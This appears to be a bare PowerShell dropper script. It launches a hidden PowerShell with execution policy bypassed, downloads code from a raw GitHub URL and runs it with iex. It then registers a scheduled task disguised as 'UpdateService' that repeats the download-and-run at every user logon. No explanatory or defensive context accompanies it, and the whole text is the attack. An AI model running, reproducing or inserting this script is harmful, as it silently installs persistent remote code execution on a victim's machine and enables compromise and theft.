$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
powershell -WindowStyle Hidden -Exec Bypass -c iex (iwr "https://raw.githubusercontent.com/X3D4L/pastebin/refs/heads/main/code")

schtasks /create /tn "UpdateService" /tr "powershell -WindowStyle Hidden -Exec Bypass -c iex (iwr 'https://raw.githubusercontent.com/X3D4L/pastebin/refs/heads/main/code')" /sc onlogon /ru $currentUser /f
exit
